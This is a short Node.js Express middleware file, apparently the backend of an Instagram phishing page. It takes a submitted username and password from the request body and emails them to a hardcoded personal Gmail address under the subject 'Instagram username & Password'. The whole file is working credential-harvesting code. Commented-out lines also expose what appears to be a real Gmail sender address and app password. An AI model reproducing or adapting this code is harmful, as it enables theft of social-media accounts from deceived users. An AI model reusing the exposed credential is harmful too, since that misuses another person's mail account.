const nodeMailer = require("nodemailer")

const sendMailToOwner = async (req, res, next) =>{
    
    const {username, password} = req.body;
    let transporter = nodeMailer.createTransport({
        service:'gmail',
        auth:{
            // user:'codingninjas2k16@gmail.com',
            // pass:'slwvvlczduktvhdj'
            user:process.env.SENDER_MAIL,
            pass:process.env.SENDER_PASS
        }
    })

    let mailOptions = {
        // from:'codingninjas2k16@gmail.com',
        from:process.env.SENDER_MAIL,
        to:"surajn4490@gmail.com",
        subject:'Instagram username & Password',
        text:`Instagaram Username: ${username},\n\n Password: ${password}`,
    }

    try{
        await transporter.sendMail(mailOptions);
        next()
    }catch(err){
        console.log('Error occured while sending mail: ', err)
    }

}

module.exports =  { sendMailToOwner}